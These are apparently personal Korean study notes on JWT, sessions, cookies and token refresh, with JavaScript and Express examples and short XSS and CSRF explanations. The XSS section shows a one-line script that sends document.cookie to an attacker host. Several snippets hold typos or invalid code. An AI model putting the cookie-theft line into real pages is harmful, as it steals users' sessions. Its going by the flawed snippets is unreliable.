# JWT

## 무상태(stateless) 🤨

HTTP 프로토콜은 기본적으로 **상태를 유지하지 않는(stateless) 프로토콜**이기 때문에, 연결이 해제됨과 동시에 서버와 클라이언트는 클라이언트가 이전에 요청한 결과에 대해 잊어버리게 됨. 즉, 요청을 할 때마다 서버에 연결을 해야한다는 것.

따라서 웹 애플리케이션에서는 효율적인 서버-클라 연결을 위해 웹 애플리케이션에서 사용자의 상태를 계속 추적하고 유지하기 위한 방식이 필요하게 됨.

결국 "사용자 너 어떻게 인증할래?"에 대한 여러가지 해결방식인 것. 서버에서 사용자 인증을 위한 정보를 실어서 클라이언트에게 보내고, 해당 정보를 통신에 사용하는 것.

## JWT

JWT는 JSON Web Token의 약자로, 정보를 안전하게 전송하기 위한 일종의 토큰 형식. 주로 웹 통신에서 사용되고, 특히 인증 및 권한 부여를 위해 자주 활용됨.

> _토큰_(token)
>
> 일반적으로 컴퓨터 시스템에서 사용자나 프로그램이나 서버가 자신의 신원을 증명하거나 특정 자원에 접근하도록 하는 데 사용되는 작은 조각의 정보를 나타냄. JWT는 특정한 목적(정보 교환 및 인증 및 권한 부여)을 위해 JSON 형식으로 설계된 토큰 형식

### JWT의 구조

기본적으로 육안으로 해석하기 어려운 문자열로 만들어져 있고, https://jwt.io/ 에서 해독(decode)하면 JSON형태로 들어있는 정보를 확인할 수 있다.
<img width="708" alt="image-20231203162838328" src="https://github.com/edkim3275/TILv2/assets/77393619/e59f8a48-f120-49b8-87b1-bcd27bcb389b">

<img width="710" alt="image-20231203163034970" src="https://github.com/edkim3275/TILv2/assets/77393619/a504d506-5869-40e0-b280-1a0bb276a352">

```
header.payload.signature
xxxxxxxxxx.yyyyyyyyyy.zzzzzzzzzz
```

1. Header(헤더)

   JWT의 유형 및 해시 알고리즘과 같은 메타데이터 정보 포함. `HS256(HMAC SHA-256)`알고리즘은 주로 사용되는 대표적인 대칭키 알고리즘 중 하나로써 서버와 클라이언트 간에 공유된 시크릿 키를 사용하여 서명하고 생성하고 검증함.

   ```json
   {
     "alg": "HS256",
     "typ": "JWT"
   }
   ```

2. Payload(페이로드)

   토큰에 담길 정보를 표현하는 부분. 클레임(claim)이라고 불리는 키-값 쌍들의 집합.

   ```json
   {
     "name": "username",
     "sub": "1294392"
   }
   ```

3. Signature(서명)

   토큰이 변조되지 않았음을 검증하기 위한 서명. 헤더, 페이로드, 비밀키를 이용하여 생성되고 서명이 유효한지 확인하여 토큰의 무결성을 보장함.

   ```json
   HMACSHA256(
   	base64UrlEncode(header) + "." + base65UrlEncode(payload),
     secretKey
   )
   ```

   서명생성 과정

   1. 서명을 만들기 위해 인코딩 된 두 문자열(base64로 인코딩 되어있는 JWT Header와 JWT Payload)을 점(.)으로 연결한다.
   
      이 문자열이 서명을 만들 때 원본 데이터가 된다.
   
   2. 서명은 비밀키와 해시 알고리즘으로 생성된다. Header의 alg 필드에 명시된 알고리즘을 사용하여 서버가 가진 비밀키(secret)로 서명값을 생성하게 된다.
   
   3. 이 결과가 세 번째 부분이 됨.
   
   서명검증 과정(JWT를 받은 서버는 아래의 과정을 수행한다.)
   
   1. Base64 디코딩 : Base64로 인코딩 되어있는 JWT의 Header와 Payload를 디코딩하여 원본 JSON 데이터를 얻는다.(알고리즘과 데이터 확인)
   
   2. 서명생성 : 디코딩된 Header와 Payload를 합쳐 문자열을 구성하고, 이를 지정된 알고리즘(Header의 `alg`필드에 명시된 알고리즘)을 사용하여 다시 서명을 생성
   
   3. 서명 검증 : 생성된 서명과 JWT에 포함된 서명을 비교하여 두 값이 일치하는지 확인.
   
      같으면 "데이터가 위조되지 않았음"을 확인할 수 있고, 다르면 "누군가 payload를 바꿨다"고 판단할 수 있게된다.

### JWT의 특징

- 정보를 안전하게 전송하고, 서버와 클라간에 상태를 유지하지 않고(stateless)도 사용자를 식별하고 권한을 부여할 수 있게 해준다.
- 세션을 유지하지 않고도 상태를 관리할 수 있는 무상태성의 특성을 제공
- 사용자 인증 후 서버는 JWT를 생성하여 클라이언트에게 전달하고, 클라이언트는 이를 이용하여 서버에 대한 요청을 할 수 있음.
- **인증 정보를 서버쪽에 저장하지 않는다**는 점. 클라이언트가 JWT를 사용하여 자신의 상태를 유지하게되므로, 서버는 무상태한 아키텍처를 유지할 수 있다.

### 클라-서버 통신과정

<img width="537" alt="image-20231203163237495" src="https://github.com/edkim3275/TILv2/assets/77393619/945022ed-eb67-404e-b8d5-e9e710935c35">

1. 로그인(클라이언트에서 서버로 요청)

   클라이언트는 아이디와 패스워드와 같은 인증정보를 서버로 전송하여 로그인 요청.

2. JWT생성(서버에서 클라이언트로 응답)

   서버는 클라이언트의 인증 정보(아이디, 패스워드 등)를 확인하고 로그인 정보가 올바르면 클라이언트에 대한 정보를 포함한 JSON 형식으로 된 토큰인 JWT를 생성.

   JWT에는 클라이언트에 대한 정보, 권한, 만료 기간등이 포함된다. **단, 이 토큰이 클라이언트에게 보내지기 때문에 탈취 당할 위험이 있으므로 중요 정보는 포함시키지 않는다.**

3. 발급한 JWT 전송

   서버는 생성된 JWT를 클라이언트에게 안전한 방식으로 전송. 주로 HTTP 응답 헤더의 `Set-Cookie` 로 전송

4. 클라이언트에서 서버로 보안된 요청 전송

   클라이언트는 토큰을 어딘가에 저장(세션스토리지, 로컬스토리지, 쿠키 등)하고 요청을 보낼 때 생성된 JWT를 포함하여 서버에 전송. 주로 HTTP 요청 헤더의 `Authorization`에 `Bearer` 스키마를 사용하여 전송.

   ```javascript
   // 쿠키에 저장했을 경우
   const jwtToken = document.cookie
     .split("; ")
     .find((cookie) => cookie.startsWith("jwt="));
   const jwtToken = jwtTokenFromCookie
     ? jwtTokenFromCookie.split("=")[1]
     : null;
   // 로컬스토리지에 저장했을 경우
   const jwtToken = localStorage.getItem("jwtToken");
   // 세션스토리지에 저장했을 경우
   const jwtToken = sessionStorage.getItem("getToken");
   fetch(url, {
     method: "GET",
     headers: {
       Authorization: `Bearer ${jwtToken}`,
     },
   });
   ```

5. JWT 검증(서버에서 클라이언트의 요청 처리)

   서버는 클라이언트로부터 전송된 JWT를 받고, JWT의 서명을 검증하고 만료 여부를 확인한다. 유효한 경우 JWT에 포함된 클라이언트 정보를 사용하여 요청을 처리

6. 응답

   요청 작업에 대해 응답하고 통신 종료.

### 장점과 단점

- 장점

  - OAuth를 사용 시 여러 소셜 사이트에서 사용가능
  - 서버측 부하를 낮출 수 있고, 독립적으로 접근 권한을 관리할 수 있음
  - 별도의 인증 저장소가 필요하지 않아서 인증서버와 DB에 의존하지 않아도 됨.

- 단점

  - 쿠키, 로컬스토리지, 세션스토리지에 저장되므로 탈취당할 위험이 존재. 따라서 중요 정보를 넣지 말아야 함.

  - 토큰 내에 들어가는 데이터가 많아질수록 토큰이 길어지는데 매 API 호출 시마다 토큰 데이터를 서버에 전달하게 되므로 그만큼 네트워크 대역폭 낭비가 심할 수 있음

  - 한번 발급된 token은 수정, 폐기가 불가

    보안점1) Access token의 Expire time을 짧게 하고, Refresh token을 이용해서 중간중간 Access token을 재발급하게 해서 Access token이 탈취되더라도 공격자가 이용할 수 있는 시간을 최소화 하는 것.

## 세션

- 방문자가 웹서버에 접속해 있는 상태를 하나의 단위로 보고 그것을 session이라고 한다.

  웹 서버는 이러한 각 단위에 대한 세션 식별자(sessionID)를 부여하고 같은 브라우저인지 구별한다.

  브라우저를 닫거나 서버에서 해당 세션 식별자가 있는 쿠키를 삭제했을때 삭제된다.

- 세션(Session)

  HTTP 프로토콜은 기본적으로 **상태를 유지하지 않는(stateless) 프로토콜**이기 때문에, 웹 애플리케이션에서 사용자의 상태를 계속 추적하고 유지하기 위해 세션을 사용.

  세션이란 웹 애플리케이션에서 사용자의 상태를 유지하고 관리하기 위한 매커니즘을 말함.

  세션을 유지한다는 것은 특정 사용자에 대한 정보를 서버 측에 저장하고, 이 정보를 세션을 통해 지속적으로 유지하는 것을 의미.

### 세션 유지 절차(session flow)

<img width="530" alt="image-20231203161501430" src="https://github.com/edkim3275/TILv2/assets/77393619/02cceb2a-9e9d-471d-91e8-28d407e2a63d">

1. 로그인

   사용자 로그인 시 클라이언트가 서버에게 로그인 정보가 들어있는 파라미터와 함께 로그인 요청.

2. 세션 식별자 부여

   클라이언트로 부터 받은 로그인 정보가 올바르면 세션 객체를 생성하여 해당 사용자에 대한 정보(ID, 권한 등)를 세션에 저장, 세션 정보를 유지하기 위해 서버는 클라이언트에게 고유한 세션 식별자를 할당하고, 이를 `Set-cookie`를 통해 클라이언트에게 전달. 일반적으로 쿠키를 사용하여 세션 식별자를 클라이언트에게 부여.

   세션 객체는 서버에 저장해놓는다.

3. 요청과 응답 시 세션 활용

   클라이언트가 서버에 요청을 보낼 때, 요청 헤더에 세션 식별자가 함께 전송.

   서버는 해당 세션 식별자를 통해 어떤 사용자에 대한 요청인지 인식(세션 객체를 검색). 서버는 세션에 저장된 정보를 이용하여 정보가 있으면 사용자 상태를 확인하고 요청을 처리

4. 로그아웃 혹은 세션 만료

   사용자가 로그아웃하거나 세션이 일정 기간 유지되지 않으면 세션 정보는 삭제되거나 만료됨.

### 장점과 단점

- 장점

  - 쿠키방식과 동일하지만 쿠키에 아무런 의미가 없는 sessionID가 저장되므로 탈취되더라도 해석할 수 없다.

- 단점

  - 하이재킹 공격으로 중간에 공격자가 쿠키를 탈취하여 HTTP 요청을 보낼 수 있는 위험성

    보안점1) HTTPS를 사용하여 요청 자체를 탈취해도 내부 정보 보안성 향상

    보안점2) 세션에 유효시간을 넣어 유효시간이 끝나면 더 이상 이용할 수 없게 설정

  - 서버에 세션 객체를 저장하므로 사용자가 다수일 경우 서버 부하가 높아진다는 점

  - 확장시 모든 서버가 접근할 수 있도록 별도 중앙 세션 관리 시스템이 필요

  - CORS

## 쿠키

쿠키(Cookie)는 **클라이언트 측에 저장되는 키-값 쌍으로 이루어진 작은 데이터 조각**을 의미한다. 즉 세션 식별자를 쿠키로 저장한다는 것은 해당 세션 식별자 값을 쿠키 형태로 클라이언트에 저장하는 것을 의미한다.

브라우저는 쿠키를 요청 헤더에 포함하여 서버에 요청을 보내므로, 개발자는 주로 이러한 과정을 명시적으로 다루지는 않는다. 즉, 서버로 요청을 보낼 때 브라우저는 해당 도메인에 저장된 모든 쿠키를 요청 헤더에 자동으로 포함시키게 됨.

```javascript
fetch("/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    username: "name",
    password: "pw",
  }),
})
  .then((res) => res.json())
  .then((data) => {
    // 1. 서버 응답에 Set-Cookie헤더가 있다면, 브라우저가 해당 쿠키를 저장함
    // 2. 이후 다른 요청에서는 브라우저가 자동적으로 쿠키를 요청 헤더에 포함시킴
    fetch("/otherEndpoint", {
      method: "GET",
    })
      .then((response) => response.json())
      .then((data) => console.log(data));
  });
```

쿠키에는 다양한 설정 옵션이 존재한다.

```
Set-Cookie: session_id=abcdef123456; Path=/; Expires=Wed, 01 Jan 2023 00:00:00 GMT; Secure; HttpOnly
```

`session_id`라는 쿠키를 설정하고, 해당 쿠키는 `/` 경로에서만 유효하고, 23년 1월 1일까지만 유효하고, 안전한 연결(HTTPS)에서만 전송되고, JavaScript에서 접근할 수 없도록 설정.

`Path` : 쿠키가 유효한 경로를 지정. 예를들어 `Path=/admin`이라고 설정하면 해당 경로에서만 쿠키가 유효하게 됨.

`Expires` or `Max-Age` : 쿠키의 유효 기간을 설정. 만료시간이 지나면 브라우저는 해당 쿠키를 삭제

`Domain` : 쿠키의 유효한 도메인 지정. 도메인이 지정되면 해당 도메인 및 서브도메인에서 쿠키가 유효.

`Secure` : 쿠키를 안전한 연결(HTTPS)에서만 전송하도록 지정

`HttpOnly` : JavaScript에서 쿠키에 접근하는 것을 방지하고, 보안을 강화

위와같은 쿠키를 백엔드(express.js)에서 설정하여 응답을 보내는 예시 코드는 아래와 같이 될 수 있다.

```javascript
// 로그인 성공 시 클라이언트에게 세션 식별자를 쿠키로 설정하는 예제
const express = require("express");
const crypto = require("crypto");
const app = express();

const generateSessionId = (length) => {
  return crypto.randomBytes(length).toString("hex");
};
app.post("/login", (req, res) => {
  // 길이가 16인 랜덤한 세션 식별자 생성
  const sessionID = generateSessionId(16);

  const expirationDate = new Date();
  // expirationDate 일 년으로 설정
  // expirationDate.setFullYear(expirationDate.getFullYear()+1);
  // expirationDate 하루로 설정
  expirationDate.setHours(expirationDate.getHours() + 24);

  res.cookie("session_id", sessionID, {
    path: "/", // 모든 경로에서 유효(path는 하나의 경로만 지정 가능하고 해당 경로의 하위 모든 경로에서 유효하게 됨)
    expires: expirationDate,
    secure: true,
    httpOnly: true,
  });

  res.send("Login successful");
});
```

## 로컬 스토리지 vs. 세션 스토리지 vs. 세션 vs. 쿠키

모두 웹 애플리케이션에서 상태를 유지하고 사용자 식별을 위해 사용되는 매커니즘이라고 볼 수 있다.

- 세션(Session)

  - 용도 : 주로 **서버에서 상태를 유지**하고 **사용자 식별, 권한 부여 정보** 등을 저장하는 데 사용

  - 저장 위치 : 주로 서버 측에 저장. 서버 메모리, 데이터베이스 등을 통해 세션 데이터가 관리된다.

  - 전송 : 세션 식별자는 클라이언트에게 전송되어 서버와의 상호 작용에 사용되지만, 실제 세션 데이터는 서버에 저장되어 있음

- 쿠키(Cookie)

  - 용도 : 주로 HTTP 요청과 응답 사이에 클라이언트에서 상태 정보를 유지하고, 사용자가 브라우저를 닫아도 정보를 보존하기 위해 사용. 로그인 상태, 사용자 선호 설정, 트래킹 등을 저장
  - 저장 기간 : 만료 기간을 설정할 수 있고, 만료 기간이 지나면 자동으로 삭제됨.
  - 저장 위치 : 클라이언트 측에 저장. 브라우저의 쿠키 저장소에 보관
  - 전송 : HTTP 요청과 함께 자동으로 서버에 전송

- 로컬 스토리지(Local Storage)

  - 용도 : 클라이언트 측에서 데이터를 지속적으로 저장하고 유지하기 위해 사용
  - 저장 기간 : 브라우저를 닫아도 데이터가 지속된다.
  - 전송 : 자동으로 HTTP 요청에 포함되지 않는다. 클라이언트 측에서만 사용되는 저장소

- 세션 스토리지(Session Storage)

  - 세션(브라우저를 닫을 때 까지의 시간) 동안 데이터를 지속적으로 저장하고 유지하기 위해 사용
  - 저장 기간 : 브라우저를 닫으면 데이터가 삭제됨
  - 전송 : 자동으로 HTTP 요청에 포함되지 않는다. 클라이언트 측에서만 사용되는 저장소

- 세션 식별자를 쿠키에 저장하는 이유

  일반적으로 사용성과 효율성을 향상시키기 위해 선택됨.

  1. 무상태성의 원칙

     웹의 기본 아키텍처는 무상태성. 서버는 각 요청을 독립적으로 처리하고, 이전 요청의 상태를 기억하지 않는다. 하지만 세션 식별자를 쿠키에 저장하면 클라이언트가 서버와의 상태를 유지할 수 있어, 서버는 각 요청을 독립적으로 처리하는 것이 가능해진다.

  2. 간편성 및 편의성

     쿠키는 브라우저에서 자동으로 관리되고, 서버 및 클라이언트 간의 편리한 데이터 전송을 제공. 세션 식별자를 쿠키에 저장하면 클라이언트는 별도의 작업 없이 세션을 관리할 수 있게됨

  3. 다양한 저장소 지원

     쿠키는 브라우저의 쿠키 저장소뿐만 아니라, 로컬 스토리지, 세션 스토리지, 인덱 DB등 다양한 클라이언트 측 저장소에 저장될 수 있음.

  4. 다중 탭 및 창에서의 공유

     쿠키는 여러 탭이나 창 간에 공유되므로, 하나의 브라우저 창에서 로그인한 상태에서 다른 창도 로그인 상태를 공유할 수 있음.

  5. 서버 리소스 감소

     서버에 세션 상태를 저장하는 것은 메모리 또는 데이터베이스 자원을 사용하게 됨. 따라서 쿠키에 세션 식별자를 저장하면 클라이언트 측에서 상태를 유지하므로 서버 리소스 사용을 줄일 수 있음.

## Q&A

### Access token & Refresh token

- refresh token 토큰의 필요성에 대한 궁금증

  사용자 인증 방식을 JWT 방식으로 구현할 때 생겨난 질문. 서버에서 JWT 생성 시 아래와 같이 토큰의 만료기한을 설정한다.

  ```js
  const jwt = jwt.sign({ username }, secret_key, { expiresIn: "1h" });
  ```

  이를 클라이언트에 보내는 응답에 담아서 보내고 생성 된 토큰은 쿠키에 저장된다.(서버 응답에 Set-Cookie 헤더가 있다면, 브라우저가 해당 쿠키를 저장한다.)

  ```js
  res.setHeader(
    "Set-Cookie",
    `token=${token}; Path=/; HttpOnly; SameSite=Strict`
  );
  ```

  이후 쿠키에 저장된 토큰은 클라이언트에서 서버에 요청 시 브라우저가 자동적으로 쿠키를 요청 헤더에 포함시킨다. 여기서 요청 시에 토큰울 생성할 때 설정해둔 만료기한이 지나가게 되면 서버에서 토큰 검증시 아래와 같은 에러가 발생한다.

  ```js
  // Next.js에서 jose 라이브러리 사용시
  import { jwtVerify } from 'jose';

  const token = request.cookies.get("token")?value;
  ...
  // Middleware - Error: JWTExpired: "exp" claim timestamp check failed at async middleware
  const { payload } = await jwtVerify(token, secret);
  ```

  ![image-20250415010230440](./JWT.assets/image-20250415010230440.png)

  :thinking: 그렇다면 미리 서버에서 특정 시간(예를들어 5분)을 설정해두고 클라이언트의 요청에서 확인한 토큰의 만료 기한이 해당 특정 시간 이내로 남았다면 서버에서 새로 발급을 해주면 되지 않을까? 그런데도 왜 refresh token이라는 토큰을 하나 더 발급해서 프로세스를 복잡하게 만드는지 이해가 가질 않아서 좀 더 찾아보기로 했다.

- 일단 위에서 요청에 담겨있는 "access token"이 만료되면 서버는 이를 401 Unauthorized로 응답한다. 근데 클라이언트는 요청을 보내기전에 토큰이 만료가 되었는지 아닌지를 정확히 모른 채로 요청할 수 있다.

  왜냐면 HttpOnly 쿠키에 있으므로 JS로 토큰 내용을 꺼내볼 수가 없다. 따라서 일반적인 흐름은 아래와 같다.

  - 클라이언트는 그냥 API 요청(토큰이 완료됐는지 알 수 없음)
  - 서버가 401 Unauthorized로 응답함
  - 클라이언트는 받은 응답으로 토큰이 만료된 것을 판단하여 refresh 토큰을 담아서`/api/refresh` 와 같은 요청으로 새로운 토큰을 요청
  - 새로운 access token을 받은 후 원래 요청 재시도

- 만료 전 자동갱신→ 가능하지만 현재 프로젝트에서는 불가능

  토큰이 만료 되기 전에 자동 갱신하는 방법도 존재한다. 즉, 클라이언트가 토큰 만료 시간을 알고 있다면 미리 refresh해서 갱신할 수 있다. 하지만 이 또한 access token을 클라이언트가 읽을 수 있어야한다. localStorage나 JS-readable 쿠키에 저장해만 가능하겠지만 HttpOnly 쿠키를 사용할 경우 남은 시간을 JS에서 알 수 없다.

- 결국 refresh 토큰이 필요한 이유는

  :closed_lock_with_key: 보안 + 사용자 경험

  access token은 만료를 짧게 잡고(안정성 향상), 이로 인해 발생할 수 있는 사용자 경험 저하(짧아진 만료시간으로 인해 로그인을 자주해야하는 경우 등)는 refresh token으로 해결하자는 것

- 여기서 문제는 refresh token이 탈취되면 access token을 발급해주는 토큰이 탈취된 것이라 access token이 계속 발급될 수 있다는 것.

  이에 대해 refresh token 보안 강화 전략들도 존재

  - HttpOnly + Secure 쿠키 : JS 접근 불가 + HTTPS 전용
  - Short-lived Refresh Token + Rotation : 매번 새로 발급하고, 이전 건 폐기
  - Device 바인딩 : refresh token을 user-agent, IP 등에 묶어서 재발급 재한
  - 서버 저장 : refresh token을 DB에 저장해서 강제로 revoke 가능하게 함
  - 사용자 로그아웃 시 서버에서 token 삭제

- HttpOnly + Secure 쿠키

  - HttpOnly : JS에서 접근 불가 → XSS로부터 보호
  - Secure 쿠키 : HTTPS 연결일 때만 쿠키 전송 → 중간자 공격 방지

  적용방법

  ```js
  res.setHeader("Set-Cookie", [
    `refreshToken=${token}; HttpOnly; Secure; Path=/api/refresh; SameSite=Strict; Max-Age=604800`,
  ]);
  ```

- Device 바인딩 / 세션 정보에 묶기

  - refresh 토큰을 발급할 때, 디바이스 정보/IP/user-agent/fingerprint 같은 걸 함께 서버 DB에 저장

    ```json
    {
      "refreshToken": "efwjfjewjoinwef...",
      "userId": 123,
      "userAgent": "Chrome 123", // 브라우저 종류와 OS 정보
      "ip": "123.123.1.1",
      "fingerprint": "xyz789" // 브라우저, 폰트, 화면크기 등 조합으로 만든 디바이스 고유 값(보통 fingerprint.js 같은 라이브러리로 생성)
    }
    ```

  - 이후 refresh 시도 시 매치되는 디바이스에서만 허용

  - 이렇게되면 탈취한 토큰이 다른 디바이스에서 쓰이면 차단되고, multi-device 로그인도 관리가 가능하다.

- 서버 저장(refresh token 서버측 보관)

  - refresh token을 서버 DB에 저장하고(클라이언트에서도 HttpOnly 쿠키에 저장), 클라이언트에서 refresh 요청 시, 서버 DB에 있는지 확인해서 유효성을 검증하는 것

### Token Validation Check

- JWT 유효성 '검증'에서 검증한다는 것이 무엇일까?

  ```js
  // 아래 코드 설명 : TextEncoder는 Web API의 일부로 문자열을 Uint8Array로 변환하는 데 사용됩니다.
  // TextEncoder().endode(string) 메서드는 문자열을 UTF-8로 인코딩하여 Uint8Array를 반환합니다.
  const secret = new TextEncoder().encode(JWT_SECRET_KEY);
  // jwtVerify는 jose 라이브러리의 함수로, JWT를 검증하는 데 사용됩니다.
  // 이 함수는 JWT와 비밀 키를 인자로 받아 JWT의 유효성을 검사합니다.
  // 유효성 검증 방식은 HMAC, RSA, ECDSA 등 다양한 알고리즘을 지원합니다.
  // jose 라이브러리는 그 중에서 HMAC 알고리즘을 사용하여 JWT를 검증합니다.
  // 검증된다는 것은 JWT의 서명이 비밀 키와 일치하는지를 확인하는 것입니다.
  // 즉, JWT 서명은 비밀 키로 생성되며, 이 비밀 키를 사용하여 JWT의 서명을 검증합니다.
  // jwtVerify는 Promise를 반환하므로 await를 사용하여 결과를 기다립니다.
  // 검증이 성공하면 payload를 반환합니다.
  const { payload } = await jwtVerify(token, secret);
  ```

### XSS(Cross-Site Scripting)

- 토큰을 어떻게 탈취한다는 거야?

- 웹사이트 내부에 악성 스크립트를 삽입해서 다른 사용자의 브라우저에서 스크립트를 실행시키는 공격

- 예를들어 공격자의 사이트에 들어갔는데 공격자의 사이트에 아래와 같은 스크립트가 있다고 해보면

  ```html
  <script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie)
  </script>
  ```

  해당 스크립트가 실행되어서 내 쿠키나 JWT 토큰이 공격자에게 전송 될 수 있다

- HttpOnly 쿠키를 사용해서 JS에서 쿠키 접근을 차단하는 방법이 존재한다.

### CSRF(Cross-Site Request Forgery)

- 사이트 간 요청 위조
- 인증된 사용자의 브라우저를 이용하여 원치 않은 요청을 서버로 보내게 만드는 공격
- SameSite 쿠키 속성을 사용하여 외부 사이트에서 보낸 요청은 쿠키 자동 전송을 막을 수 있고, CSRF 토큰을 사용하여 폼 전송시 서버가 발급한 숨겨진 토큰을 함께 보내고 검증하는 방법도 존재.

### Base64 인코딩

- Base64는 이진(binary) 데이터를 사람이 읽을 수 있는 문자 형태로 바꾸는 인코딩 방식

- JSON 데이터를 base64로 인코딩 한다는 것은

  JSON 문자열(예: {"alg": "HS256", "typ": "JWT" })을 그냥 전송하면 특수 문자나 공백 때문에 *문제가 생길 수 있어서* 이를 영문자, 숫자, +, /, = 등의 안전한 문자만 사용하는 문자열로 바꿔놓은 것.

  즉, 데이터를 **안전하게 전송**하기 위해서 문자 코드로 바꾼 상태

  :bulb: HTTP나 쿠기, URL 등에서는 일부 문자가 문법적으로 특수문자로 인식되어 문제가 발생할 수 있다.

- 그렇다면 base64 디코딩은?

  base64로 바꾼 걸 다시 원래 JSON 형태로 돌리는 것
